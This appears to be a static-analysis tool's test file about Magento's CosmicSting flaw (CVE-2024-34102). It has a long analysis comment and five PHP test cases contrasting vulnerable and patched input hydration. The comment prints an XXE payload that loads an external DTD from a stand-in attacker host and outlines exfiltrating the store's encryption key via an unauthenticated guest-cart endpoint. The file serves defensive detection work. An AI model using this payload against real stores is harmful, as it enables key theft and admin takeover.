# Rank 1350 / CVE-2024-34102 ("CosmicSting", CVSS 9.8, CWE-611): Magento's REST
# and SOAP entry point hydrates service-method arguments out of the request body
# by reflection, and before 2.4.7-p1 it would hydrate *any* class reflection
# named for it -- including a SimpleXMLElement subclass, whose constructor is an
# XML parser.
#
# The chain is entirely inside two files. Magento\Webapi\Controller\Rest\
# InputParamsResolver::getInputData() takes the decoded body --
# `$inputData = $this->request->getRequestData();` -- and resolve() hands it to
# Magento\Framework\Webapi\ServiceInputProcessor::process($serviceClass,
# $serviceMethod, $inputData). process() walks the service method's declared
# parameters and calls convertValue($paramValue, $type) for each; convertValue
# routes anything non-scalar to _createFromArray($type, $data), which does:
#
#   $className = (string) $className;
#   $class = new ClassReflection($className);
#   $constructorArgs = $this->getConstructorData($className, $data);
#   $object = $this->objectManager->create($className, $constructorArgs);
#
# and getConstructorData() reflects that class's __construct, then for every
# constructor parameter *whose name appears as a key in the payload* recurses
# back into convertValue($data[$parameter->getName()], $parameterType). So the
# payload's own key names steer which types get hydrated next, one constructor
# parameter at a time, and the values become that constructor's arguments.
#
# The attacker walks that recursion down to a constructor parameter typed as a
# SimpleXMLElement subclass -- Magento\Framework\Simplexml\Element extends
# \SimpleXMLElement, and \SimpleXMLElement::__construct($data, $options,
# $dataIsURL) parses $data with the libxml flags in $options -- and supplies
# both: `{"data": "<!DOCTYPE r [<!ENTITY % sp SYSTEM \"http://attacker/x.dtd\">
# %sp;]><r/>", "options": 16}`. LIBXML_DTDVALID (16) turns DTD loading on, libxml
# fetches the attacker's external DTD, and a parameter entity built over
# `php://filter/convert.base64-encode/resource=app/etc/env.php` sends Magento's
# `crypt/key` back out of band. With the encryption key the attacker signs an
# admin integration token and reaches administrative endpoints, which is the
# RCE half of the published exploit. No authentication is needed: guest-cart
# endpoints such as POST /rest/V1/guest-carts/{id}/estimate-shipping-methods
# reach process() with an attacker-shaped `address` object.
#
# Step 0, COMMIT_OK notwithstanding. The pool row's d10435b11ada4e502dca7539f8fd
# 31d059d3c482 is "Magento Release 2.4.7-p1" by the packaging service: 268 files
# and several unrelated patches (the InputParamsResolver key-collision filter,
# QuoteAddressValidator, PathValidator). It is nevertheless the right row and
# needs no correction, on two counts. Its diff does contain this fix, verbatim
# and alone in lib/internal/Magento/Framework/Webapi/ServiceInputProcessor.php:
#
#   + if (is_subclass_of($className, \SimpleXMLElement::class)
#   +     || is_subclass_of($className, \DOMElement::class)) {
#   +     throw new SerializationException(new Phrase('Invalid data type'));
#   + }
#     $class = new ClassReflection($className);
#
# and its parent is the 2.4.7 release, i.e. the state that shipped vulnerable.
# The same guard was developed in the open on 2.4-develop as the "AC-10815 - API
# Input validation" series -- 2a0af7ad8bea first restricts the type
# (`$class->isSubclassOf(\SimpleXMLElement::class) || ... \DOMNode::class`) while
# dropping the earlier name-based mitigation that rejected a `sourcedata` key,
# 91995dc5c65a turns the return into the SerializationException, dbea8e059f87
# moves the check from getConstructorData() to _createFromArray() -- but no
# single commit there has the whole fix, and each of their parents already
# carries part of it, so none of them is a better `<fix>^`.
#
# ATTENTION, precision cost. Scanning the affected module at both revisions with
# `timeout 180 ./bin/vyql scan --cache off --max-ram 6GB` -- the whole repository
# is far past the bound, so the scan covers the sparse checkout of
# lib/internal/Magento/Framework/{Webapi,Simplexml,Api} plus
# app/code/Magento/Webapi, 302 PHP files including both files of the chain --
# reports 40 findings at each revision, and the sets differ by exactly one
# fingerprint: a VYQL-RF-043 (code.StateChangingOp, the attributeValueFactory
# setter chain) that moves from ServiceInputProcessor.php:392 to :398 because the
# guard is six lines long. Nothing is reported in _createFromArray,
# getConstructorData, process, resolve or getInputData at either revision. The
# six VYQL-DESER-015 findings in that scan are the unhardened
# `simplexml_load_string($string, $this->_elementClass)` in
# Simplexml/Config.php:147 and its unit tests -- Magento's config-file loader,
# not this path. `vyql match` over the two files reports `== source == (none)`:
# the request accessors are unlabelled, and so is the instantiation.
#
# Neither end of the chain is labelled, and the sink end is the one that cannot
# be. There is no XML parser call anywhere in the vulnerable code: the parse
# happens in a constructor that the DI container invokes, on a class named by a
# runtime string that reflection produced (`$this->typeProcessor->getParamType(
# $parameter)`), so no call site for it exists in any file and no resolution
# strategy could recover one. This is the gadget-chain shape -- the dangerous
# operation lives in a constructor selected at runtime -- not a construct the
# engine mishandles, so there is nothing here to sweep as an engine gap.
#
# What is left is the absence-of-restriction signal, and Magento's own tree
# measures it unshippable. The narrowest honest form is "a function that
# reflects a runtime class name and then instantiates it with a caller-supplied
# array, with no type restriction on what may be instantiated". In the 302 files
# scanned it matches twice: ServiceInputProcessor::_createFromArray, the true
# positive, and Api/ExtensionAttributesFactory::create, which does
# `new \ReflectionClass($this->getExtensibleInterfaceName($extensibleClassName))`
# and then `$this->objectManager->create($extensionFactoryName)` with a `$data`
# array and no is_subclass_of anywhere -- one false positive for one true
# positive, inside the module that contains the CVE. Widen it to
# `$objectManager->create($variableClassName, ...)` alone and it matches 13 call
# sites in those same 302 files, every other one a generated `*Factory` whose
# entire body is that line (ValidatorFactory, FlagFactory, CurrencyFactory,
# UrlFactory, Api/ObjectFactory, Api/Search/{SearchResult,Document,SearchCriteria}
# Factory, Api/ExtensionAttribute/JoinDataInterfaceFactory);
# Magento ships that class on the order of a thousand times, so the shape is the
# framework's ordinary object construction and not a weakness at all. Narrowing
# instead by naming getConstructorData, or `sourcedata`, or Magento's own
# hydrator method names, is a repro-shaped patch that the next reflective
# hydrator walks straight past. No definition change attempted.
#
# The four tests below pin that. The first two are the real chain either side of
# the guard; the third and fourth are the same pair with the Magento vocabulary
# removed, a reflective hydrator differing only in whether it restricts the type
# it will instantiate; the fifth is the co-located ordinary factory that shares
# the shape and must stay silent if the shape is ever labelled.
#
# verify_current_expected: attention-precision-cost, both revisions rejected.

test "rank1350: the webapi input processor hydrates any reflected class from the request body, constructor arguments included"
  lang php
  file lib/internal/Magento/Framework/Webapi/ServiceInputProcessor.php
  reject VYQL-DESER-001
  reject VYQL-DESER-021
  reject_review code.PolymorphicTypeSelectionReview
  code
  ```
  <?php
  namespace Magento\Framework\Webapi;

  use Laminas\Code\Reflection\ClassReflection;

  class InputParamsResolver
  {
      private $request;
      private $router;
      private $serviceInputProcessor;

      public function resolve()
      {
          $route = $this->router->match($this->request);

          return $this->serviceInputProcessor->process(
              $route->getServiceClass(),
              $route->getServiceMethod(),
              $this->getInputData()
          );
      }

      public function getInputData()
      {
          return $this->request->getRequestData();
      }
  }

  class ServiceInputProcessor
  {
      private $config;
      private $methodsMap;
      private $objectManager;
      private $typeProcessor;

      public function process($serviceClassName, $serviceMethodName, array $inputArray)
      {
          $inputData = [];
          foreach ($this->methodsMap->getMethodParams($serviceClassName, $serviceMethodName) as $param) {
              $paramName = $param['name'];
              if (isset($inputArray[$paramName])) {
                  $inputData[] = $this->convertValue($inputArray[$paramName], $param['type']);
              }
          }

          return $inputData;
      }

      public function convertValue($data, $type)
      {
          if ($this->typeProcessor->isTypeSimple($type) || $this->typeProcessor->isTypeAny($type)) {
              return $this->typeProcessor->processSimpleAndAnyType($data, $type);
          }

          return $this->_createFromArray($type, $data);
      }

      private function getConstructorData(string $className, array $data): array
      {
          $preferenceClass = $this->config->getPreference($className);
          $class = new ClassReflection($preferenceClass ?: $className);

          try {
              $constructor = $class->getMethod('__construct');
          } catch (\ReflectionException $e) {
              return [];
          }

          $res = [];
          foreach ($constructor->getParameters() as $parameter) {
              if (isset($data[$parameter->getName()])) {
                  $parameterType = $this->typeProcessor->getParamType($parameter);
                  $res[$parameter->getName()] = $this->convertValue($data[$parameter->getName()], $parameterType);
              }
          }

          return $res;
      }

      protected function _createFromArray($className, $data)
      {
          $data = is_array($data) ? $data : [];
          // convert to string directly to avoid situations when $className is object
          // which implements __toString method like \ReflectionObject
          $className = (string) $className;
          $class = new ClassReflection($className);
          $constructorArgs = $this->getConstructorData($className, $data);
          $object = $this->objectManager->create($className, $constructorArgs);

          return $object;
      }
  }
  ```

test "rank1350: the same input processor refusing to hydrate an XML document class"
  lang php
  file lib/internal/Magento/Framework/Webapi/ServiceInputProcessor.php
  reject VYQL-DESER-001
  reject VYQL-DESER-021
  reject_review code.PolymorphicTypeSelectionReview
  code
  ```
  <?php
  namespace Magento\Framework\Webapi;

  use Laminas\Code\Reflection\ClassReflection;
  use Magento\Framework\Exception\SerializationException;
  use Magento\Framework\Phrase;

  class InputParamsResolver
  {
      private $request;
      private $router;
      private $serviceInputProcessor;

      public function resolve()
      {
          $route = $this->router->match($this->request);

          return $this->serviceInputProcessor->process(
              $route->getServiceClass(),
              $route->getServiceMethod(),
              $this->getInputData()
          );
      }

      public function getInputData()
      {
          return $this->request->getRequestData();
      }
  }

  class ServiceInputProcessor
  {
      private $config;
      private $methodsMap;
      private $objectManager;
      private $typeProcessor;

      public function process($serviceClassName, $serviceMethodName, array $inputArray)
      {
          $inputData = [];
          foreach ($this->methodsMap->getMethodParams($serviceClassName, $serviceMethodName) as $param) {
              $paramName = $param['name'];
              if (isset($inputArray[$paramName])) {
                  $inputData[] = $this->convertValue($inputArray[$paramName], $param['type']);
              }
          }

          return $inputData;
      }

      public function convertValue($data, $type)
      {
          if ($this->typeProcessor->isTypeSimple($type) || $this->typeProcessor->isTypeAny($type)) {
              return $this->typeProcessor->processSimpleAndAnyType($data, $type);
          }

          return $this->_createFromArray($type, $data);
      }

      private function getConstructorData(string $className, array $data): array
      {
          $preferenceClass = $this->config->getPreference($className);
          $class = new ClassReflection($preferenceClass ?: $className);

          try {
              $constructor = $class->getMethod('__construct');
          } catch (\ReflectionException $e) {
              return [];
          }

          $res = [];
          foreach ($constructor->getParameters() as $parameter) {
              if (isset($data[$parameter->getName()])) {
                  $parameterType = $this->typeProcessor->getParamType($parameter);
                  $res[$parameter->getName()] = $this->convertValue($data[$parameter->getName()], $parameterType);
              }
          }

          return $res;
      }

      protected function _createFromArray($className, $data)
      {
          $data = is_array($data) ? $data : [];
          // convert to string directly to avoid situations when $className is object
          // which implements __toString method like \ReflectionObject
          $className = (string) $className;
          if (is_subclass_of($className, \SimpleXMLElement::class)
              || is_subclass_of($className, \DOMElement::class)) {
              throw new SerializationException(
                  new Phrase('Invalid data type')
              );
          }
          $class = new ClassReflection($className);
          $constructorArgs = $this->getConstructorData($className, $data);
          $object = $this->objectManager->create($className, $constructorArgs);

          return $object;
      }
  }
  ```

test "rank1350: minimal pair -- a reflective hydrator that instantiates whatever class the payload steers it to"
  lang php
  file Acme/Rpc/Hydrator.php
  reject VYQL-DESER-001
  reject VYQL-DESER-021
  reject_review code.PolymorphicTypeSelectionReview
  code
  ```
  <?php
  namespace Acme\Rpc;

  class Hydrator
  {
      private $factory;

      public function handle($method, array $payload)
      {
          $reflection = new \ReflectionMethod($this->serviceFor($method), 'run');
          $args = [];
          foreach ($reflection->getParameters() as $parameter) {
              $name = $parameter->getName();
              if (isset($payload[$name])) {
                  $args[$name] = $this->hydrate($parameter->getType()->getName(), $payload[$name]);
              }
          }

          return $args;
      }

      private function hydrate($className, $value)
      {
          if (!is_array($value)) {
              return $value;
          }
          $className = (string) $className;
          $class = new \ReflectionClass($className);
          $ctorArgs = [];
          $ctor = $class->getConstructor();
          if ($ctor !== null) {
              foreach ($ctor->getParameters() as $parameter) {
                  $name = $parameter->getName();
                  if (isset($value[$name])) {
                      $ctorArgs[$name] = $this->hydrate($parameter->getType()->getName(), $value[$name]);
                  }
              }
          }

          return $this->factory->create($className, $ctorArgs);
      }
  }
  ```

test "rank1350: minimal pair -- the identical hydrator restricted to the types it is allowed to instantiate"
  lang php
  file Acme/Rpc/Hydrator.php
  reject VYQL-DESER-001
  reject VYQL-DESER-021
  reject_review code.PolymorphicTypeSelectionReview
  code
  ```
  <?php
  namespace Acme\Rpc;

  class Hydrator
  {
      private $factory;

      public function handle($method, array $payload)
      {
          $reflection = new \ReflectionMethod($this->serviceFor($method), 'run');
          $args = [];
          foreach ($reflection->getParameters() as $parameter) {
              $name = $parameter->getName();
              if (isset($payload[$name])) {
                  $args[$name] = $this->hydrate($parameter->getType()->getName(), $payload[$name]);
              }
          }

          return $args;
      }

      private function hydrate($className, $value)
      {
          if (!is_array($value)) {
              return $value;
          }
          $className = (string) $className;
          if (!is_subclass_of($className, DataTransferObject::class)) {
              throw new \InvalidArgumentException('Invalid data type');
          }
          $class = new \ReflectionClass($className);
          $ctorArgs = [];
          $ctor = $class->getConstructor();
          if ($ctor !== null) {
              foreach ($ctor->getParameters() as $parameter) {
                  $name = $parameter->getName();
                  if (isset($value[$name])) {
                      $ctorArgs[$name] = $this->hydrate($parameter->getType()->getName(), $value[$name]);
                  }
              }
          }

          return $this->factory->create($className, $ctorArgs);
      }
  }
  ```

test "rank1350: an ordinary framework factory reflecting a derived class name and creating it is not a finding"
  lang php
  file lib/internal/Magento/Framework/Api/ExtensionAttributesFactory.php
  reject VYQL-DESER-001
  reject VYQL-DESER-021
  reject_review code.PolymorphicTypeSelectionReview
  code
  ```
  <?php
  namespace Magento\Framework\Api;

  class ExtensionAttributesFactory
  {
      private $objectManager;

      public function create($extensibleClassName, $data = [])
      {
          $interfaceReflection = new \ReflectionClass($this->getExtensibleInterfaceName($extensibleClassName));

          $methodReflection = $interfaceReflection->getMethod('getExtensionAttributes');
          if ($methodReflection->getDeclaringClass()->getName() === self::EXTENSIBLE_INTERFACE_NAME) {
              throw new \LogicException('Method getExtensionAttributes must be overridden.');
          }

          $interfaceName = '\\' . $interfaceReflection->getName();
          $extensionClassName = substr($interfaceName, 0, -strlen('Interface')) . 'Extension';
          $extensionFactoryName = $extensionClassName . 'Factory';
          $extensionFactory = $this->objectManager->create($extensionFactoryName);

          return $extensionFactory->create($data);
      }
  }
  ```
